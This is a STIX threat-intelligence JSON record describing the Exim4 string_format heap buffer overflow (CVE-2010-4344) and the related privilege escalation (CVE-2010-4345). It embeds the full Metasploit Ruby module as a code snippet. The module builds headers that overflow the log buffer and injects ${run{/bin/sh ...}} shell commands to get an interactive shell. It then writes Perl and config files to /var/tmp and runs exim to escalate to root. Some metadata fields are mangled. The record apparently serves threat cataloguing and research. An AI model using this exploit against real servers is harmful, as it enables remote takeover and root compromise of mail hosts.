{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ef62ac44-0363-431f-b4ed-f8c9abb0e2ad",
    "created": "2024-08-14T17:14:07.781795Z",
    "modified": "2024-08-14T17:14:07.781799Z",
    "name": "Exim4 string_format Function Heap Buffer Overflow",
    "description": " This module exploits a heap buffer overflow within versions of Exim prior to version 4.69. By sending a specially crafted message, an attacker can corrupt the heap and execute arbitrary code with the privileges of the Exim daemon.  The root cause is that no check is made to ensure that the buffer is not full prior to handling '%s' format specifiers within the 'string_vformat' function. In order to trigger this issue, we get our message rejected by sending a message that is too large. This will call into log_write to log rejection headers (which is a default configuration setting). After filling the buffer, a long header string is sent. In a successful attempt, it overwrites the ACL for the 'MAIL FROM' command. By sending a second message, the string we sent will be evaluated with 'expand_string' and arbitrary shell commands can be executed.  It is likely that this issue could also be exploited using other techniques such as targeting in-band heap management structures, or perhaps even function pointers stored in the heap. However, these techniques would likely be far more platform specific, more complicated, and less reliable.  This bug was original found and reported in December 2008, but was not properly handled as a security issue. Therefore, there was a 2 year lag time between when the issue was fixed and when it was discovered being exploited",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/smtp/exim4_string_format.rb",
            "external_id": "exim4_string_format.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-4344"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-4345"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/oss-sec/2010/q4/311"
        },
        {
            "source_name": "reference",
            "url": "http://www.gossamer-threads.com/lists/exim/dev/89477"
        },
        {
            "source_name": "reference",
            "url": "http://bugs.exim.org/show_bug.cgi?id=787"
        },
        {
            "source_name": "reference",
            "url": "http://git.exim.org/exim.git/commitdiff/24c929a27415c7cfc7126c47e4cad39acf3efa6b"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Smtp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Exim4 string_format Function Heap Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a heap buffer overflow within versions of Exim prior to\n        version 4.69. By sending a specially crafted message, an attacker can corrupt the\n        heap and execute arbitrary code with the privileges of the Exim daemon.\n\n        The root cause is that no check is made to ensure that the buffer is not full\n        prior to handling '%s' format specifiers within the 'string_vformat' function.\n        In order to trigger this issue, we get our message rejected by sending a message\n        that is too large. This will call into log_write to log rejection headers (which\n        is a default configuration setting). After filling the buffer, a long header\n        string is sent. In a successful attempt, it overwrites the ACL for the 'MAIL\n        FROM' command. By sending a second message, the string we sent will be evaluated\n        with 'expand_string' and arbitrary shell commands can be executed.\n\n        It is likely that this issue could also be exploited using other techniques such\n        as targeting in-band heap management structures, or perhaps even function pointers\n        stored in the heap. However, these techniques would likely be far more platform\n        specific, more complicated, and less reliable.\n\n        This bug was original found and reported in December 2008, but was not\n        properly handled as a security issue. Therefore, there was a 2 year lag time\n        between when the issue was fixed and when it was discovered being exploited\n        in the wild. At that point, the issue was assigned a CVE and began being\n        addressed by downstream vendors.\n\n        An additional vulnerability, CVE-2010-4345, was also used in the attack that\n        led to the discovery of danger of this bug. This bug allows a local user to\n        gain root privileges from the Exim user account. If the Perl interpreter is\n        found on the remote system, this module will automatically exploit the\n        secondary bug as well to get root.\n      },\n      'Author'         => [ 'jduck', 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2010-4344' ],\n          [ 'CVE', '2010-4345' ],\n          [ 'OSVDB', '69685' ],\n          [ 'OSVDB', '69860' ],\n          [ 'BID', '45308' ],\n          [ 'BID', '45341' ],\n          [ 'URL', 'https://seclists.org/oss-sec/2010/q4/311' ],\n          [ 'URL', 'http://www.gossamer-threads.com/lists/exim/dev/89477' ],\n          [ 'URL', 'http://bugs.exim.org/show_bug.cgi?id=787' ],\n          [ 'URL', 'http://git.exim.org/exim.git/commitdiff/24c929a27415c7cfc7126c47e4cad39acf3efa6b' ]\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Space'       => 8192, # much more in reality, but w/e\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic perl ruby telnet',\n            }\n        },\n      'Platform'       => 'unix',\n      'Arch'           => ARCH_CMD,\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ],\n        ],\n      # Originally discovered/reported Dec 2 2008\n      'DisclosureDate' => '2010-12-07', # as an actual security bug\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('MAILFROM', [ true, 'FROM address of the e-mail', 'root@localhost']),\n        OptString.new('MAILTO', [ true, 'TO address of the e-mail', 'postmaster@localhost']),\n        OptString.new('EHLO_NAME', [ false, 'The name to send in the EHLO' ])\n      ])\n\n    register_advanced_options(\n      [\n        OptString.new(\"SourceAddress\", [false, \"The IP or hostname of this system as the target will resolve it\"]),\n        OptBool.new(\"SkipEscalation\", [true, \"Specify this to skip the root escalation attempt\", false]),\n        OptBool.new(\"SkipVersionCheck\", [true, \"Specify this to skip the version check\", false])\n      ])\n  end\n\n  def exploit\n    #\n    # Connect and grab the banner\n    #\n    ehlo = datastore['EHLO_NAME']\n    ehlo ||= Rex::Text.rand_text_alphanumeric(8) + \".com\"\n\n    print_status(\"Connecting to #{rhost}:#{rport} ...\")\n    connect\n\n    print_status(\"Server: #{self.banner.to_s.strip}\")\n    if self.banner.to_s !~ /Exim /\n      disconnect\n      fail_with(Failure::NoTarget, \"The target server is not running Exim!\")\n    end\n\n    if not datastore['SkipVersionCheck'] and self.banner !~ /Exim 4\\.6\\d+/i\n      fail_with(Failure::Unknown, \"Warning: This version of Exim is not exploitable\")\n    end\n\n    ehlo_resp = raw_send_recv(\"EHLO #{ehlo}\\r\\n\")\n    ehlo_resp.each_line do |line|\n      print_status(\"EHLO: #{line.strip}\")\n    end\n\n    #\n    # Determine the maximum message size\n    #\n    max_msg = 52428800\n    if ehlo_resp.to_s =~ /250-SIZE (\\d+)/\n      max_msg = $1.to_i\n    end\n\n    #\n    # Determine what hostname the server sees\n    #\n    saddr = nil\n    revdns = nil\n    if ehlo_resp =~ /^250.*Hello ([^\\s]+) \\[([^\\]]+)\\]/\n      revdns = $1\n      saddr = $2\n    end\n    source = saddr || datastore[\"SourceAddress\"] || Rex::Socket.source_address('1.2.3.4')\n    print_status(\"Determined our hostname is #{revdns} and IP address is #{source}\")\n\n\n    #\n    # Initiate the message\n    #\n    from = datastore['MAILFROM']\n    to   = datastore['MAILTO']\n\n    resp = raw_send_recv(\"MAIL FROM: #{from}\\r\\n\")\n    resp ||= 'no response'\n    msg = \"MAIL: #{resp.strip}\"\n    if not resp or resp[0,3] != '250'\n      fail_with(Failure::Unknown, msg)\n    else\n      print_status(msg)\n    end\n\n    resp = raw_send_recv(\"RCPT TO: #{to}\\r\\n\")\n    resp ||= 'no response'\n    msg = \"RCPT: #{resp.strip}\"\n    if not resp or resp[0,3] != '250'\n      fail_with(Failure::Unknown, msg)\n    else\n      print_status(msg)\n    end\n\n    resp = raw_send_recv(\"DATA\\r\\n\")\n    resp ||= 'no response'\n    msg = \"DATA: #{resp.strip}\"\n    if not resp or resp[0,3] != '354'\n      fail_with(Failure::Unknown, msg)\n    else\n      print_status(msg)\n    end\n\n\n    #\n    # Calculate the headers\n    #\n    msg_len         = max_msg + (1024*256) # just for good measure\n    log_buffer_size = 8192\n\n    host_part = \"H=\"\n    if revdns and revdns != ehlo\n      host_part << revdns << \" \"\n    end\n    host_part << \"(#{ehlo})\"\n\n    # The initial headers will fill up the 'log_buffer' variable in 'log_write' function\n    print_status(\"Constructing initial headers ...\")\n    log_buffer = \"YYYY-MM-DD HH:MM:SS XXXXXX-YYYYYY-ZZ rejected from <#{from}> #{host_part} [#{source}]: \"\n    log_buffer << \"message too big: read=#{msg_len} max=#{max_msg}\\n\"\n    log_buffer << \"Envelope-from: <#{from}>\\nEnvelope-to: <#{to}>\\n\"\n\n    # We want 2 bytes left, so we subtract from log_buffer_size here\n    log_buffer_size -= 3 # account for the nul termination too\n\n    # Now, \"  \" + hdrline for each header\n    hdrs = []\n    while log_buffer.length < log_buffer_size\n      header_name = rand_text_alpha(10).capitalize\n      filler = rand_text_alphanumeric(8 * 16)\n      hdr = \"#{header_name}: #{filler}\\n\"\n\n      one = (2 + hdr.length)\n      two = 2 * one\n      left = log_buffer_size - log_buffer.length\n      if left < two and left > one\n        left -= 4 # the two double spaces\n        first = left / 2\n        hdr = hdr.slice(0, first - 1) + \"\\n\"\n        hdrs << hdr\n        log_buffer << \"  \" << hdr\n\n        second = left - first\n        header_name = rand_text_alpha(10).capitalize\n        filler = rand_text_alphanumeric(8 * 16)\n        hdr = \"#{header_name}: #{filler}\\n\"\n        hdr = hdr.slice(0, second - 1) + \"\\n\"\n      end\n      hdrs << hdr\n      log_buffer << \"  \" << hdr\n    end\n    hdrs1 = hdrs.join\n\n    # This header will smash various heap stuff, hopefully including the ACL\n    header_name = Rex::Text.rand_text_alpha(7).capitalize\n    print_status(\"Constructing HeaderX ...\")\n    hdrx = \"#{header_name}: \"\n    1.upto(50) { |a|\n      3.upto(12) { |b|\n        hdrx << \"${run{/bin/sh -c 'exec /bin/sh -i <&#{b} >&0 2>&0'}} \"\n      }\n    }\n\n    # In order to trigger the overflow, we must get our message rejected.\n    # To do so, we send a message that is larger than the maximum.\n\n    print_status(\"Constructing body ...\")\n    body = ''\n    fill = (Rex::Text.rand_text_alphanumeric(254) + \"\\r\\n\") * 16384\n\n    while(body.length < msg_len)\n      body << fill\n    end\n    body = body[0, msg_len]\n\n    print_status(\"Sending #{msg_len / (1024*1024)} megabytes of data...\")\n    sock.put hdrs1\n    sock.put hdrx\n    sock.put \"\\r\\n\"\n    sock.put body\n\n    print_status(\"Ending first message.\")\n    buf = raw_send_recv(\"\\r\\n.\\r\\n\")\n    # Should be: \"552 Message size exceeds maximum permitted\\r\\n\"\n    print_status(\"Result: #{buf.inspect}\") if buf\n\n    second_result = \"\"\n\n    print_status(\"Sending second message ...\")\n    buf = raw_send_recv(\"MAIL FROM: #{datastore['MAILFROM']}\\r\\n\")\n    # Should be: \"sh-x.x$ \" !!\n    if buf\n      print_status(\"MAIL result: #{buf.inspect}\")\n      second_result << buf\n    end\n\n    buf = raw_send_recv(\"RCPT TO: #{datastore['MAILTO']}\\r\\n\")\n    # Should be: \"sh: RCPT: command not found\\n\"\n    if buf\n      print_status(\"RCPT result: #{buf.inspect}\")\n      second_result << buf\n    end\n\n    # Clear pending output from the socket\n    buf = sock.get_once(-1, 1.0)\n    second_result << buf if buf\n    sock.put(\"source /etc/profile >/dev/null 2>&1\\n\")\n    buf = sock.get_once(-1, 2.0)\n    second_result << buf if buf\n\n    # Check output for success\n    if second_result !~ /(MAIL|RCPT|sh: |sh-[0-9]+)/\n      print_error(\"Second result: #{second_result.inspect}\")\n      fail_with(Failure::Unknown, 'Something went wrong, perhaps this host is patched?')\n    end\n\n    resp = ''\n    if not datastore['SkipEscalation']\n      print_status(\"Looking for Perl to facilitate escalation...\")\n      # Check for Perl as a way to escalate our payload\n      sock.put(\"perl -V\\n\")\n      select(nil, nil, nil, 3.0)\n      resp = sock.get_once(-1, 10.0)\n    end\n\n    if resp !~ /Summary of my perl/\n      print_status(\"Should have a shell now, sending payload...\")\n      buf = raw_send_recv(\"\\n\" + payload.encoded + \"\\n\\n\")\n      if buf\n        if buf =~ /554 SMTP synchronization error/\n          print_error(\"This target may be patched: #{buf.strip}\")\n        else\n          print_status(\"Payload result: #{buf.inspect}\")\n        end\n      end\n    else\n      print_status(\"Perl binary detected, attempt to escalate...\")\n\n      token = Rex::Text.rand_text_alpha(8)\n      # Flush the output from the shell\n      sock.get_once(-1, 0.1)\n\n      # Find the perl interpreter path\n      sock.put(\"which perl;echo #{token}\\n\")\n      buff = \"\"\n      cnt  =\n      while not buff.index(token)\n        res = sock.get_once(-1, 0.25)\n        buff << res if res\n      end\n\n      perl_path = buff.gsub(token, \"\").gsub(/\\/perl.*/m, \"/perl\").strip\n      print_status(\"Using Perl interpreter at #{perl_path}...\")\n\n      temp_conf = \"/var/tmp/\" + Rex::Text.rand_text_alpha(8)\n      temp_perl = \"/var/tmp/\" + Rex::Text.rand_text_alpha(8)\n      temp_eof  = Rex::Text.rand_text_alpha(8)\n\n      print_status(\"Creating temporary files #{temp_conf} and #{temp_perl}...\")\n\n      data_conf = \"spool_directory = ${run{#{perl_path} #{temp_perl}}}\\n\".unpack(\"H*\")[0]\n      sock.put(\"perl -e 'print pack qq{H*},shift' #{data_conf} > #{temp_conf}\\n\")\n\n      data_perl =\t\"#!/usr/bin/perl\\n$) = $( = $> = $< = 0; system<DATA>;\\n__DATA__\\n#{payload.encoded}\\n\".unpack(\"H*\")[0]\n      sock.put(\"perl -e 'print pack qq{H*},shift' #{data_perl} > #{temp_perl}\\n\")\n\n      print_status(\"Attempting to execute payload as root...\")\n      sock.put(\"PATH=/bin:/sbin:/usr/sbin:/usr/bin:/usr/local/sbin:/usr/local/bin exim -C#{temp_conf} -q\\n\")\n    end\n\n    # Give some time for the payload to be consumed\n    select(nil, nil, nil, 4)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_contributors": [
        "[ jduck",
        "hdm ]",
        ""
    ],
    "x_mitre_disclosure_date": "2010-12-07, # as an actual security bug",
    "x_mitre_platforms": [
        "unix'"
    ]
}